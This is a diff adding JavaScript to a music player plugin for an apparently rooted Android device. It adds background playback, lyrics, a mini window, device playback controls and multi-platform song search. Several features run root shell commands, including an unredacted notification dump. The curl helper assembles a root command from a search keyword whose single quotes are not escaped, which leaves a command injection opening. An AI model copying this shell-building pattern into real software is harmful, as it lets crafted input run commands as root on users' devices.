+        document.body.appendChild(lyricsBar)
+
+        // ---- audio 元素 ----
+        _audio = new Audio()
+        _audio.volume = 0.8
+
+        // ---- 后台持续播放支持 ----
+        var _requestWakeLock = async function() {
+            try {
+                if ('wakeLock' in navigator) {
+                    _wakeLock = await navigator.wakeLock.request('screen')
+                }
+            } catch(e) {}
+        }
+        var _releaseWakeLock = async function() {
+            if (_wakeLock) {
+                try { await _wakeLock.release() } catch(e) {}
+                _wakeLock = null
+            }
+        }
+        // 页面可见性变化时重新获取 WakeLock + 保存播放进度
+        document.addEventListener('visibilitychange', async function() {
+            if (document.visibilityState === 'hidden') {
+                _savePlayProgress()
+            }
+            if (_bgPlayEnabled && document.visibilityState === 'visible' && _isPlaying) {
+                await _requestWakeLock()
+            }
+        })
+        // 页面关闭前保存进度
+        window.addEventListener('beforeunload', function() {
+            _savePlayProgress()
+        })
+        // 后台保活：定时器保持主线程活跃，确保音频不中断
+        var _startBgKeepAlive = function() {
+            if (_bgKeepAliveTimer) return
+            _bgKeepAliveTimer = setInterval(function() {
+                // 空操作定时器，保持主线程唤醒
+                if (!_isPlaying) {
+                    _stopBgKeepAlive()
+                }
+            }, 1000)
+        }
+        var _stopBgKeepAlive = function() {
+            if (_bgKeepAliveTimer) { clearInterval(_bgKeepAliveTimer); _bgKeepAliveTimer = null }
+        }
+
+        // ---- MediaSession API 支持（锁屏/通知栏控制） ----
+        var _updateMediaSession = function() {
+            if (!('mediaSession' in navigator) || _currentIndex < 0) return
+            var song = _playlist[_currentIndex]
+            if (!song) return
+            var titleParts = (song.title || '未知歌曲').split(' - ')
+            var artist = titleParts.length > 1 ? titleParts[0] : ''
+            var title = titleParts.length > 1 ? titleParts.slice(1).join(' - ') : song.title
+            try {
+                navigator.mediaSession.metadata = new MediaMetadata({
+                    title: title || '未知歌曲',
+                    artist: artist || '未知歌手',
+                    album: song.album || '',
+                })
+            } catch(e) {}
+        }
+        if ('mediaSession' in navigator) {
+            try {
+                navigator.mediaSession.setActionHandler('play', function() { play() })
+                navigator.mediaSession.setActionHandler('pause', function() { pause() })
+                navigator.mediaSession.setActionHandler('previoustrack', function() { playPrev() })
+                navigator.mediaSession.setActionHandler('nexttrack', function() { playNext() })
+            } catch(e) {}
+        }
+
+        // ---- 后台播放开关 ----
+        var _updateBgSwitch = function() {
+            var sw = document.getElementById('sm_bg_switch')
+            if (!sw) return
+            if (_bgPlayEnabled) sw.classList.add('_on')
+            else sw.classList.remove('_on')
+        }
+        var _toggleBgPlay = function() {
+            _bgPlayEnabled = !_bgPlayEnabled
+            try { localStorage.setItem('smart_music_bgplay', _bgPlayEnabled ? '1' : '0') } catch(e) {}
+            _updateBgSwitch()
+            if (_bgPlayEnabled) {
+                _requestWakeLock()
+                if (_isPlaying) _startBgKeepAlive()
+                showToast('后台播放已开启', 'green', 2000)
+            } else {
+                _releaseWakeLock()
+                _stopBgKeepAlive()
+                showToast('后台播放已关闭', 'pink', 2000)
+            }
+        }
+
+        // ---- ADB 设备播放 ----
+        var _shellCurl2 = (typeof shellCurl !== 'undefined') ? shellCurl : null
+        var _runShell = (typeof runShellWithRoot !== 'undefined') ? runShellWithRoot : null
+        var _adbPlaying = false
+
+        var _checkAdbAvailable = async function() {
+            if (!_runShell) return false
+            try {
+                var res = await _runShell('pidof adbd')
+                if (res && res.content && res.content.trim()) return true
+                // 尝试网络ADB
+                var res2 = await _runShell('getprop service.adb.tcp.port')
+                if (res2 && res2.content && res2.content.trim() !== '0' && res2.content.trim() !== '') return true
+                // 检查 adb 二进制
+                var res3 = await _runShell('ls /data/data/com.minikano.f50_sms/files/adb 2>/dev/null')
+                if (res3 && res3.content && res3.content.includes('adb')) return true
+                return true  // 有root权限默认认为可用
+            } catch(e) {
+                return true
+            }
+        }
+
+        var _updateAdbStatus = function(text, isPlaying) {
+            var el = document.getElementById('sm_adb_status')
+            var btn = document.getElementById('sm_adb_play_btn')
+            if (el) el.textContent = text
+            if (btn) {
+                if (isPlaying) {
+                    btn.classList.add('_playing')
+                    btn.textContent = '▶ 设备播放中'
+                } else {
+                    btn.classList.remove('_playing')
+                    btn.textContent = '▶ 推送到设备播放'
+                }
+            }
+            _adbPlaying = isPlaying
+        }
+
+        var playOnDevice = async function() {
+            if (_adbPlaying) {
+                showToast('设备正在播放中，先停止当前播放', 'pink', 2000)
+                return
+            }
+            if (_currentIndex < 0 || !_playlist[_currentIndex]) {
+                showToast('请先在播放列表中选择一首歌曲', 'pink', 2000)
+                return
+            }
+            var song = _playlist[_currentIndex]
+            if (!song.url) {
+                showToast('当前歌曲没有可用的播放地址', 'red', 3000)
+                return
+            }
+            if (!_runShell) {
+                showToast('没有 Root/Shell 权限，无法推送到设备', 'red', 3000)
+                return
+            }
+            _updateAdbStatus('正在推送到设备...', false)
+            showToast('正在推送: ' + (song.title || '未知歌曲') + ' 到设备...', 'pink', 3000)
+            try {
+                // 方法1: 用 am start 直接在设备上播放音频URL
+                var audioUrl = song.url.replace(/'/g, '')
+                var cmd1 = "am start -a android.intent.action.VIEW -d '" + audioUrl + "' -t audio/*"
+                var res = await _runShell(cmd1, 15000)
+                if (res && res.success) {
+                    _updateAdbStatus('已在设备上播放: ' + (song.title || '未知歌曲'), true)
+                    showToast('已在设备上播放！', 'green', 3000)
+                    return
+                }
+                // 方法2: 用媒体控制器
+                var cmd2 = "am start -n com.android.music/.MediaPlaybackActivity -d '" + audioUrl + "' -t audio/*"
+                var res2 = await _runShell(cmd2, 15000)
+                if (res2 && res2.success) {
+                    _updateAdbStatus('已在设备上播放: ' + (song.title || '未知歌曲'), true)
+                    showToast('已在设备上播放！', 'green', 3000)
+                    return
+                }
+                // 方法3: 用 noice/app
+                var cmd3 = "am start -a android.intent.action.MUSIC_PLAYER"
+                var res3 = await _runShell(cmd3, 10000)
+                _updateAdbStatus('已尝试打开设备音乐播放器', true)
+                showToast('已尝试打开设备音乐播放器，请手动播放', 'pink', 3000)
+            } catch(e) {
+                _updateAdbStatus('推送失败: ' + (e.message || '未知错误'), false)
+                showToast('推送到设备失败: ' + (e.message || ''), 'red', 4000)
+            }
+        }
+
+        var stopDevicePlay = async function() {
+            if (!_runShell) {
+                showToast('没有 Root/Shell 权限', 'red', 2000)
+                return
+            }
+            try {
+                // 停止设备上的媒体播放
+                await _runShell('am broadcast -a com.android.music.musicservicecommand.pause', 10000)
+                // 备用：用 media session 命令
+                await _runShell('cmd media_session dispatch pause', 10000)
+                _updateAdbStatus('已停止设备播放', false)
+                showToast('已停止设备播放', 'pink', 2000)
+            } catch(e) {
+                showToast('停止设备播放失败', 'red', 2000)
+            }
+        }
+
+        // ---- 小窗模式 ----
+        var _isMiniMode = false
+        var _miniPos = { x: 0, y: 0 }
+        var _miniDrag = { dragging: false, startX: 0, startY: 0, origX: 0, origY: 0 }
+
+        var toggleMiniMode = function() {
+            if (!_isMiniMode) {
+                // 进入小窗模式
+                _isMiniMode = true
+                panel.classList.add('_mini')
+                overlay.classList.remove('_show')
+                // 恢复保存的位置
+                try {
+                    var saved = localStorage.getItem('smart_music_mini_pos')
+                    if (saved) {
+                        var pos = JSON.parse(saved)
+                        panel.style.left = pos.x + 'px'
+                        panel.style.top = pos.y + 'px'
+                        panel.style.right = 'auto'
+                    }
+                } catch(e) {}
+                showToast('已切换为小窗模式，可拖动 · 点击恢复', 'pink', 2500)
+            } else {
+                // 退出小窗模式，恢复正常
+                _isMiniMode = false
+                panel.classList.remove('_mini')
+                panel.style.left = ''
+                panel.style.top = ''
+                panel.style.right = ''
+                overlay.classList.add('_show')
+            }
+        }
+
+        // 小窗拖动
+        var _onMiniDragStart = function(e) {
+            if (!_isMiniMode) return
+            var touch = e.touches ? e.touches[0] : e
+            _miniDrag.dragging = true
+            _miniDrag.startX = touch.clientX
+            _miniDrag.startY = touch.clientY
+            var rect = panel.getBoundingClientRect()
+            _miniDrag.origX = rect.left
+            _miniDrag.origY = rect.top
+            e.preventDefault()
+        }
+        var _onMiniDragMove = function(e) {
+            if (!_miniDrag.dragging) return
+            var touch = e.touches ? e.touches[0] : e
+            var dx = touch.clientX - _miniDrag.startX
+            var dy = touch.clientY - _miniDrag.startY
+            var newX = Math.max(0, Math.min(window.innerWidth - panel.offsetWidth, _miniDrag.origX + dx))
+            var newY = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, _miniDrag.origY + dy))
+            panel.style.left = newX + 'px'
+            panel.style.top = newY + 'px'
+            panel.style.right = 'auto'
+            e.preventDefault()
+        }
+        var _onMiniDragEnd = function(e) {
+            if (!_miniDrag.dragging) return
+            _miniDrag.dragging = false
+            // 计算移动距离
+            var touch = e && e.changedTouches ? e.changedTouches[0] : (e || { clientX: _miniDrag.startX, clientY: _miniDrag.startY })
+            var dx = Math.abs((touch.clientX || 0) - _miniDrag.startX)
+            var dy = Math.abs((touch.clientY || 0) - _miniDrag.startY)
+            
+            // 保存位置
+            try {
+                var rect = panel.getBoundingClientRect()
+                localStorage.setItem('smart_music_mini_pos', JSON.stringify({ x: rect.left, y: rect.top }))
+            } catch(e) {}
+            
+            // 如果移动距离很小（小于5像素），认为是点击，恢复成大窗口
+            // 但要排除点击了按钮/开关的情况
+            if (dx < 5 && dy < 5 && e && e.target) {
+                var target = e.target
+                // 如果点的是按钮、开关、进度条等控件，不恢复
+                var isControl = target.closest('button') || 
+                               target.closest('.sm-bg-switch') ||
+                               target.closest('.sm-seek-bar') ||
+                               target.closest('.sm-vol-bar') ||
+                               target.closest('.sm-minimize-btn') ||
+                               target.closest('input') ||
+                               target.closest('select') ||
+                               target.closest('.sm-tab')
+                if (!isControl && _isMiniMode) {
+                    toggleMiniMode()
+                }
+            }
+        }
+
+        // ---- 高级后台音乐同步 ----
+        var _bgSyncEnabled = false
+        var _bgSyncTimer = null
+        var _lastBgTrack = ''
+        var _isSyncingFromBg = false  // 防止双向同步死循环
+
+        var _getBgMusicInfo = async function() {
+            if (!_runShell) return null
+            try {
+                // 通过 dumpsys 获取当前媒体播放信息
+                var cmd = 'dumpsys media_session 2>/dev/null | grep -A 30 "ACTIVE" | head -40'
+                var res = await _runShell(cmd, 8000)
+                if (!res || !res.content) return null
+                var text = res.content
+
+                // 提取歌曲信息
+                var title = ''
+                var artist = ''
+                var state = ''
+
+                // 匹配 state
+                var stateMatch = text.match(/state=(\w+)/i)
+                if (stateMatch) state = stateMatch[1].toLowerCase()
+
+                // 匹配 metadata
+                var titleMatch = text.match(/title=([^\n]+)/i)
+                if (titleMatch) title = titleMatch[1].trim()
+
+                var artistMatch = text.match(/artist=([^\n]+)/i)
+                if (artistMatch) artist = artistMatch[1].trim()
+
+                // 如果没找到，尝试从 notification 中获取
+                if (!title) {
+                    var cmd2 = 'dumpsys notification --noredact 2>/dev/null | grep -B 2 -A 2 "media.session\|MediaStyle\|android.media.session.MediaSession" | head -30'
+                    var res2 = await _runShell(cmd2, 8000)
+                    if (res2 && res2.content) {
+                        var tMatch = res2.content.match(/android\.title=([^\n]+)/i)
+                        if (tMatch) title = tMatch[1].trim()
+                        var aMatch = res2.content.match(/android\.text=([^\n]+)/i)
+                        if (aMatch) artist = aMatch[1].trim()
+                    }
+                }
+
+                if (!title && !artist) return null
+
+                return {
+                    title: title,
+                    artist: artist,
+                    isPlaying: state === 'playing' || state === 'active'
+                }
+            } catch(e) {
+                return null
+            }
+        }
+
+        var _startBgSync = function() {
+            if (_bgSyncTimer) return
+            _bgSyncEnabled = true
+            try { localStorage.setItem('smart_music_bgsync', '1') } catch(e) {}
+            _bgSyncTimer = setInterval(async function() {
+                if (_isSyncingFromBg) return
+                var info = await _getBgMusicInfo()
+                if (info && info.title) {
+                    var trackKey = info.artist + ' - ' + info.title
+                    if (trackKey !== _lastBgTrack) {
+                        _lastBgTrack = trackKey
+                        _isSyncingFromBg = true
+                        // 更新显示
+                        var nowPlayingEl = document.getElementById('sm_now_playing')
+                        if (nowPlayingEl) {
+                            nowPlayingEl.textContent = (info.artist ? info.artist + ' - ' : '') + info.title + ' 📱'
+                        }
+                        // 更新后台同步状态显示
+                        var syncStatusEl = document.getElementById('sm_bgsync_status')
+                        if (syncStatusEl) {
+                            syncStatusEl.textContent = '🎵 ' + (info.title || '未知歌曲')
+                        }
+                        // 更新 MediaSession
+                        _updateMediaSession()
+                        _isSyncingFromBg = false
+                    }
+                    // 同步播放状态
+                    if (info.isPlaying !== _isPlaying && !_isSyncingFromBg) {
+                        _isPlaying = info.isPlaying
+                        updatePlayBtn()
+                        if (info.isPlaying) {
+                            startProgressTimer()
+                        } else {
+                            stopProgressTimer()
+                        }
+                    }
+                }
+            }, 2000)
+             showToast('高级后台同步已开启', 'green', 2000)
+             var statusEl = document.getElementById('sm_bgsync_status')
+             if (statusEl) statusEl.textContent = '同步中...'
+         }
+
+        var _stopBgSync = function() {
+            _bgSyncEnabled = false
+            try { localStorage.setItem('smart_music_bgsync', '0') } catch(e) {}
+            if (_bgSyncTimer) { clearInterval(_bgSyncTimer); _bgSyncTimer = null }
+            _lastBgTrack = ''
+            showToast('高级后台同步已关闭', 'pink', 2000)
+            var statusEl = document.getElementById('sm_bgsync_status')
+            if (statusEl) statusEl.textContent = '未开启同步'
+        }
+
+        var _toggleBgSync = function() {
+            if (_bgSyncEnabled) {
+                _stopBgSync()
+            } else {
+                if (!_runShell) {
+                    showToast('需要 Root/Shell 权限才能使用后台同步', 'red', 3000)
+                    return
+                }
+                _startBgSync()
+            }
+            _updateBgSyncSwitch()
+        }
+
+        var _updateBgSyncSwitch = function() {
+            var sw = document.getElementById('sm_bgsync_switch')
+            if (!sw) return
+            if (_bgSyncEnabled) sw.classList.add('_on')
+            else sw.classList.remove('_on')
+        }
+
+        // 后台音乐控制（上一曲/播放暂停/下一曲）
+        var bgMusicPrev = async function() {
+            if (!_runShell) { showToast('需要 Root/Shell 权限', 'red', 2000); return }
+            try {
+                await _runShell('cmd media_session dispatch previous', 5000)
+                showToast('上一曲', 'pink', 1500)
+            } catch(e) {
+                showToast('控制失败', 'red', 2000)
+            }
+        }
+
+        var bgMusicPlayPause = async function() {
+            if (!_runShell) { showToast('需要 Root/Shell 权限', 'red', 2000); return }
+            try {
+                var info = await _getBgMusicInfo()
+                if (info && info.isPlaying) {
+                    await _runShell('cmd media_session dispatch pause', 5000)
+                    _isPlaying = false
+                    showToast('暂停', 'pink', 1500)
+                } else {
+                    await _runShell('cmd media_session dispatch play', 5000)
+                    _isPlaying = true
+                    showToast('播放', 'pink', 1500)
+                }
+                updatePlayBtn()
+            } catch(e) {
+                showToast('控制失败', 'red', 2000)
+            }
+        }
+
+        var bgMusicNext = async function() {
+            if (!_runShell) { showToast('需要 Root/Shell 权限', 'red', 2000); return }
+            try {
+                await _runShell('cmd media_session dispatch next', 5000)
+                showToast('下一曲', 'pink', 1500)
+            } catch(e) {
+                showToast('控制失败', 'red', 2000)
+            }
+        }
+
+        // ---- 辅助 ----
+        var fmtTime = function(sec) {
+            if (!sec || isNaN(sec) || sec < 0) return '0:00'
+            var m = Math.floor(sec / 60)
+            var s = Math.floor(sec % 60)
+            return m + ':' + (s < 10 ? '0' : '') + s
+        }
+
+        var showToast = function(msg, color, dur) {
+            try { if (typeof createToast === 'function') createToast(msg, color || 'pink', dur || 2500) } catch(e) {}
+        }
+
+        // ---- 渲染播放列表 ----
+        var renderPlaylist = function() {
+            var container = document.getElementById('sm_playlist_container')
+            if (!container) return
+            if (!_playlist.length) {
+                container.innerHTML = '<div class="sm-empty">播放列表为空，添加音频 URL 或扫描本地音乐</div>'
+                return
+            }
+            var html = ''
+            for (var i = 0; i < _playlist.length; i++) {
+                var item = _playlist[i]
+                var isActive = i === _currentIndex
+                var hasLrc = item.lrc ? ' 🎤' : ''
+                var isFav = item.pfId ? isFavorited(item.pfId) : false
+                var favBtn = item.pfId ? '<span class="sm-fav-btn' + (isFav ? ' _active' : '') + '" data-pl-fav="' + i + '">' + (isFav ? '❤️' : '🤍') + '</span>' : ''
+                html += '<div class="sm-playlist-item' + (isActive ? ' _active' : '') + '" data-idx="' + i + '">'
+                    + '<span class="_title">' + (item.title || ('歌曲' + (i+1))) + hasLrc + '</span>'
+                    + favBtn
+                    + '<button class="sm-btn sm-btn-del _del" data-del="' + i + '">删除</button>'
+                    + '</div>'
+            }
+            container.innerHTML = html
+        }
+
+        // ---- 加载歌曲 ----
+        var loadSong = function(idx) {
+            if (idx < 0 || idx >= _playlist.length) return
+            _currentIndex = idx
+            _retryCount = 0
+            var song = _playlist[idx]
+            _audio.src = song.url
+            _audio.load()
+            _updateMediaSession()
+
+            // 更新标题
+            var np = document.getElementById('sm_now_playing')
+            if (np) np.textContent = song.title || ('歌曲' + (idx + 1))
+
+            // 解析歌词
+            _lrcData = parseLRC(song.lrc || '')
+            _lrcLineIndex = -1
+
+            // 更新歌词输入框
+            var ta = document.getElementById('sm_lrc_textarea')
+            if (ta) ta.value = song.lrc || ''
+
+            renderPlaylist()
+            updateLyricsBar()
+        }
+
+        // ---- 播放/暂停 ----
+        var play = function() {
+            if (_currentIndex < 0 && _playlist.length > 0) loadSong(0)
+            if (_currentIndex < 0) { showToast('请先添加歌曲', 'red'); return }
+            _audio.play().then(function() {
+                _isPlaying = true
+                updatePlayBtn()
+                startProgressTimer()
+                _updateMediaSession()
+                if (_bgPlayEnabled) {
+                    _requestWakeLock()
+                    _startBgKeepAlive()
+                }
+                if ('mediaSession' in navigator) {
+                    navigator.mediaSession.playbackState = 'playing'
+                }
+            }).catch(function(e) {
+                showToast('播放失败: ' + (e.message || '浏览器限制'), 'red', 4000)
+            })
+        }
+
+        var pause = function() {
+            _audio.pause()
+            _isPlaying = false
+            updatePlayBtn()
+            stopProgressTimer()
+            _stopBgKeepAlive()
+            _savePlayProgress()  // 保存播放进度
+            if ('mediaSession' in navigator) {
+                navigator.mediaSession.playbackState = 'paused'
+            }
+        }
+
+        // 保存播放进度到 localStorage
+        var _savePlayProgress = function() {
+            try {
+                if (_currentIndex >= 0 && _audio && _audio.currentTime >= 0) {
+                    localStorage.setItem('smart_music_progress', JSON.stringify({
+                        idx: _currentIndex,
+                        time: _audio.currentTime || 0
+                    }))
+                }
+            } catch(e) {}
+        }
+
+        // 恢复播放进度并自动播放
+        var _tryAutoResume = function() {
+            if (!_autoPlayEnabled || _playlist.length === 0) return
+            try {
+                var saved = localStorage.getItem('smart_music_progress')
+                if (saved) {
+                    var data = JSON.parse(saved)
+                    var idx = data.idx || 0
+                    var time = data.time || 0
+                    if (idx >= 0 && idx < _playlist.length) {
+                        loadSong(idx)
+                        // 等 canplay 再 play + seek
+                        var onCanPlay = function() {
+                            _audio.removeEventListener('canplay', onCanPlay)
+                            if (time > 0) _audio.currentTime = time
+                            _audio.play().then(function() {
+                                _isPlaying = true
+                                updatePlayBtn()
+                                startProgressTimer()
+                                if (_bgPlayEnabled) {
+                                    _requestWakeLock()
+                                    _startBgKeepAlive()
+                                }
+                                if ('mediaSession' in navigator) {
+                                    navigator.mediaSession.playbackState = 'playing'
+                                }
+                                showToast('⏯ 自动续播已恢复', 'green', 1500)
+                            }).catch(function(e) {
+                                // 自动播放被浏览器阻止了，等用户交互再播
+                                console.log('auto play blocked:', e.message)
+                                // 先加载好歌曲，用户点播放按钮就能续播
+                                _isPlaying = false
+                                updatePlayBtn()
+                                if (time > 0) _audio.currentTime = time
+                                // 提示用户
+                                showToast('⏯ 自动续播已就绪，点播放开始', 'yellow', 3000)
+                                // 监听第一次用户交互后自动播放
+                                var autoPlayOnInteract = function() {
+                                    if (_autoPlayEnabled && !_isPlaying && _audio.src) {
+                                        _audio.play().then(function() {
+                                            _isPlaying = true
+                                            updatePlayBtn()
+                                            startProgressTimer()
+                                            if ('mediaSession' in navigator) {
+                                                navigator.mediaSession.playbackState = 'playing'
+                                            }
+                                        }).catch(function(){})
+                                    }
+                                    document.removeEventListener('click', autoPlayOnInteract)
+                                    document.removeEventListener('touchstart', autoPlayOnInteract)
+                                }
+                                setTimeout(function() {
+                                    document.addEventListener('click', autoPlayOnInteract, { once: true })
+                                    document.addEventListener('touchstart', autoPlayOnInteract, { once: true })
+                                }, 500)
+                            })
+                        }
+                        _audio.addEventListener('canplay', onCanPlay)
+                    }
+                }
+            } catch(e) {}
+        }
+
+        var togglePlay = function() {
+            if (_isPlaying) pause(); else play()
+        }
+
+        var updatePlayBtn = function() {
+            var btn = document.getElementById('sm_play_btn')
+            if (!btn) return
+            if (_isPlaying) {
+                btn.textContent = '⏸ 暂停'
+                btn.className = 'sm-btn sm-btn-pause'
+            } else {
+                btn.textContent = '▶ 播放'
+                btn.className = 'sm-btn sm-btn-play'
+            }
+        }
+
+        // ---- 进度条 ----
+        var startProgressTimer = function() {
+            stopProgressTimer()
+            _progressTimer = setInterval(updateProgress, 300)
+        }
+
+        var stopProgressTimer = function() {
+            if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null }
+        }
+
+        var _lastSaveTime = 0
+        var updateProgress = function() {
+            var cur = _audio.currentTime || 0
+            var dur = _audio.duration || 0
+            var pct = dur > 0 ? (cur / dur * 100) : 0
+            var fill = document.getElementById('sm_seek_fill')
+            if (fill) fill.style.width = pct + '%'
+            var ct = document.getElementById('sm_cur_time')
+            if (ct) ct.textContent = fmtTime(cur)
+            var dt = document.getElementById('sm_dur_time')
+            if (dt) dt.textContent = fmtTime(dur)
+
+            // 更新歌词
+            updateLyricsByTime(cur)
+
+            // 每30秒自动保存一次进度
+            if (_isPlaying && cur - _lastSaveTime > 30) {
+                _lastSaveTime = cur
+                _savePlayProgress()
+            }
+        }
+
+        // ---- 歌词同步 ----
+        var updateLyricsByTime = function(time) {
+            if (!_lrcData.length) return
+            var newIdx = findLrcIndex(time)
+            if (newIdx !== _lrcLineIndex) {
+                _lrcLineIndex = newIdx
+                updateLyricsBar()
+            }
+        }
+
+        var updateLyricsBar = function() {
+            var curEl = document.getElementById('sm_lyric_cur')
+            var nextEl = document.getElementById('sm_lyric_next')
+            if (!curEl) return
+
+            if (!_lrcData.length || _lrcLineIndex < 0) {
+                var np = document.getElementById('sm_now_playing')
+                curEl.textContent = np ? ('🎵 ' + np.textContent) : '🎵'
+                if (nextEl) nextEl.textContent = ''
+                return
+            }
+            curEl.textContent = _lrcData[_lrcLineIndex].text || '🎵'
+            if (nextEl && _lrcLineIndex + 1 < _lrcData.length) {
+                nextEl.textContent = _lrcData[_lrcLineIndex + 1].text || ''
+            } else {
+                if (nextEl) nextEl.textContent = ''
+            }
+        }
+
+        // ---- 切歌 ----
+        var playNext = function() {
+            if (!_playlist.length) return
+            var next = (_currentIndex + 1) % _playlist.length
+            loadSong(next)
+            play()
+        }
+
+        var playPrev = function() {
+            if (!_playlist.length) return
+            var prev = (_currentIndex - 1 + _playlist.length) % _playlist.length
+            loadSong(prev)
+            play()
+        }
+
+        // ---- Listen 1 多源音乐搜索（网易云 / QQ音乐 / 酷狗） ----
+        var _searchResults = []
+        var _searching = false
+        var _activePlatforms = { netease: true, qq: true, kugou: true, kuwo: true, migu: true }
+        var _searchStatus = { netease: 'idle', qq: 'idle', kugou: 'idle', kuwo: 'idle', migu: 'idle' }
+
+        var searchAll = async function() {
+            if (_searching) return
+            var input = document.getElementById('sm_search_input')
+            var keyword = (input && input.value || '').trim()
+            if (!keyword) { showToast('请输入歌曲名或歌手', 'red'); return }
+
+            _searching = true
+            _searchResults = []
+            showSearchLoading('🔍 聚合音源多平台搜索中...')
+            _searchStatus = { netease: 'idle', qq: 'idle', kugou: 'idle', kuwo: 'idle', migu: 'idle' }
+
+            var tasks = []
+            if (_activePlatforms.netease) {
+                _searchStatus.netease = 'searching'
+                tasks.push(searchNetease(keyword))
+            }
+            if (_activePlatforms.qq) {
+                _searchStatus.qq = 'searching'
+                tasks.push(searchQQ(keyword))
+            }
+            if (_activePlatforms.kugou) {
+                _searchStatus.kugou = 'searching'
+                tasks.push(searchKugou(keyword))
+            }
+            if (_activePlatforms.kuwo) {
+                _searchStatus.kuwo = 'searching'
+                tasks.push(searchKuwo(keyword))
+            }
+            if (_activePlatforms.migu) {
+                _searchStatus.migu = 'searching'
+                tasks.push(searchMigu(keyword))
+            }
+
+            // 并行搜索，结果陆续展示
+            Promise.all(tasks.map(function(p) {
+                return p.catch(function(e) { return [] })
+            })).then(function(results) {
+                _searching = false
+                updatePlatformButtons()
+                if (_searchResults.length === 0) {
+                    showSearchEmpty()
+                    showToast('未找到相关歌曲，试试其他平台', 'pink', 2500)
+                } else {
+                    renderSearchResults()
+                    showToast('找到 ' + _searchResults.length + ' 首歌曲', 'green', 2000)
+                }
+            })
+        }
+
+        var updatePlatformButtons = function() {
+            var btns = document.querySelectorAll('#sm_platform_filter .sm-pf-btn')
+            btns.forEach(function(btn) {
+                var pf = btn.getAttribute('data-pf')
+                if (_searchStatus[pf] === 'searching') btn.classList.add('_searching')
+                else btn.classList.remove('_searching')
+            })
+        }
+
+        var shellCurl = async function(url, extraHeaders) {
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return null
+            var hdr = extraHeaders || ''
+            var cmd = "curl -s --max-time 10 '" + url + "' " + hdr + " 2>/dev/null"
+            var res = await _rs(cmd)
+            var text = (res && res.content || '').trim()
+            var jsonStart = text.indexOf('{')
+            if (jsonStart > 0) text = text.substring(jsonStart)
+            return text
+        }
+
+        // 网易云搜索
+        var searchNetease = async function(keyword) {
+            try {
+                var text = await shellCurl(
+                    'https://music.163.com/api/search/get?s=' + encodeURIComponent(keyword) + '&type=1&offset=0&limit=15',
+                    "-H 'Referer: https://music.163.com' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10)'"
+                )
+                if (!text) throw new Error('无返回')
+                var data = JSON.parse(text)
+                if (data && data.result && data.result.songs) {
+                    var list = data.result.songs.map(function(s) {
+                        return {
+                            id: 'wy_' + s.id,
+                            platform: 'netease',
+                            pfName: '网易云',
+                            songId: s.id,
+                            name: s.name,
+                            artists: (s.artists || []).map(function(a) { return a.name }),
+                            album: s.album ? s.album.name : '',
+                            duration: s.duration || 0
+                        }
+                    })
+                    _searchResults = _searchResults.concat(list)
+                    renderSearchResults()
+                    _searchStatus.netease = 'done'
+                    updatePlatformButtons()
+                    return list
+                }
+                _searchStatus.netease = 'failed'
+                return []
+            } catch(e) {
+                _searchStatus.netease = 'failed'
+                updatePlatformButtons()
+                return []
+            }
+        }
+
+        // QQ音乐搜索
+        var searchQQ = async function(keyword) {
+            try {
+                var text = await shellCurl(
+                    'https://c.y.qq.com/soso/fcgi-bin/client_search_cp?w=' + encodeURIComponent(keyword) + '&n=15&p=1&format=json',
+                    "-H 'Referer: https://y.qq.com' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10)'"
+                )
+                if (!text) throw new Error('无返回')
+                // QQ可能返回callback包裹，去掉
+                if (text.indexOf('callback') >= 0 || text.charAt(0) !== '{') {
+                    var s = text.indexOf('{')
+                    var e = text.lastIndexOf('}')
+                    if (s >= 0 && e > s) text = text.substring(s, e + 1)
+                }
+                var data = JSON.parse(text)
+                var songs = []
+                if (data && data.data && data.data.song && data.data.song.list) {
+                    songs = data.data.song.list.map(function(s) {
+                        var artists = (s.singer || []).map(function(a) { return a.name })
+                        return {
+                            id: 'qq_' + s.songmid,
+                            platform: 'qq',
+                            pfName: 'QQ音乐',
+                            songId: s.songmid,
+                            songIdNum: s.songid,
+                            name: s.songname,
+                            artists: artists,
+                            album: s.albumname || '',
+                            duration: (s.interval || 0) * 1000
+                        }
+                    })
+                    _searchResults = _searchResults.concat(songs)
+                    renderSearchResults()
+                }
+                _searchStatus.qq = 'done'
+                updatePlatformButtons()
+                return songs
+            } catch(e) {
+                _searchStatus.qq = 'failed'
+                updatePlatformButtons()
+                return []
+            }
+        }
+
+        // 酷狗搜索
+        var searchKugou = async function(keyword) {
+            try {
+                var text = await shellCurl(
+                    'https://songsearch.kugou.com/song_search_v2?keyword=' + encodeURIComponent(keyword) + '&pagesize=15&page=1&platform=WebFilter',
+                    "-H 'Referer: https://www.kugou.com' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10)'"
+                )
+                if (!text) throw new Error('无返回')
+                var data = JSON.parse(text)
+                var songs = []
+                if (data && data.data && data.data.lists) {
+                    songs = data.data.lists.map(function(s) {
+                        return {
+                            id: 'kg_' + s.FileHash,
+                            platform: 'kugou',
+                            pfName: '酷狗',
+                            songId: s.FileHash,
+                            albumId: s.AlbumID,
+                            name: s.SongName,
+                            artists: s.SingerName ? [s.SingerName] : [],
+                            album: s.AlbumName || '',
+                            duration: (s.Duration || 0) * 1000
+                        }
+                    })
+                    _searchResults = _searchResults.concat(songs)
+                    renderSearchResults()
+                }
+                _searchStatus.kugou = 'done'
+                updatePlatformButtons()
+                return songs
+            } catch(e) {
+                _searchStatus.kugou = 'failed'
+                updatePlatformButtons()
+                return []
+            }
+        }
+
+        // 酷我搜索
+        var searchKuwo = async function(keyword) {
+            try {
+                var text = await shellCurl(
+                    'http://www.kuwo.cn/api/www/search/searchMusicBykeyWord?key=' + encodeURIComponent(keyword) + '&pn=1&rn=15&httpsStatus=1&reqId=' + Date.now(),
+                    "-H 'Referer: http://www.kuwo.cn/' -H 'csrf: 00000000000000000000000000000000' -H 'Cookie: kw_token=00000000000000000000000000000000' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10)'"
+                )
+                if (!text) throw new Error('无返回')
+                var data = JSON.parse(text)
+                var songs = []
+                if (data && data.data && data.data.list) {
+                    songs = data.data.list.map(function(s) {
+                        return {
+                            id: 'kw_' + s.rid,
+                            platform: 'kuwo',
+                            pfName: '酷我',
+                            songId: s.rid,
+                            name: s.name,
+                            artists: s.artist ? s.artist.split('&') : [],
+                            album: s.album || '',
+                            duration: (s.duration || 0) * 1000
+                        }
+                    })
